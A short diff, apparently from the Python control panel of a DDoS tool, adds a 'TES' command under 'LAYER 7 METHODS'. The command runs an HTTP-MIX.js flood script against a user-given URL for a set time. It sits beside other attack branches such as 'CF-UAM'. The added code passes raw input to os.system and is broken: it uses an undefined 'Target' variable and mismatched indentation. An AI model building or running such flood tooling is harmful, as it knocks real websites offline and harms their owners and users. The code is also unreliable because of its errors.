@@ -88,6 +88,15 @@ def main():
                 
 # LAYER 7 METHODS
 
+         if "TES" in cnc:
+            try:
+                target = cnc.split()[1]
+                time = cnc.split()[2]
+                os.system(f'HTTP-MIX.js {Target} {time}')
+            except IndexError:
+                print('Usage: HTTP-MIX <url> <time>')
+                print('Example: HTTP-MIX example.com 60')
+		    
         elif "CF-UAM" in cnc:
             try:
                 url = cnc.split()[1]
